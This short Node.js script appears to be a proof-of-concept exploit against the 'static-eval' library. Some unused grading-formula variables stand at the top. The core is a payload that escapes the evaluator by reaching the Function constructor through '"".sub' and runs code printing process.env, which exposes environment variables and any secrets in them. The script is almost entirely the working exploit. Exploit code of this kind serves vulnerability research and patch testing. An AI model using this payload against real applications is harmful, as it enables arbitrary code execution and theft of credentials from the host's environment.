const evaluate = require("static-eval");
const parse = require("esprima").parse;

// main
const exam = "25";
const paper = "25";
const assignment = "25";
const formula = "[0.20 * assignment + 0.25 * exam + 0.25 * paper]";

var payload = '(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()';
var ast = parse(payload).body[0].expression;
var res = evaluate(ast, {x:1});

console.log(res);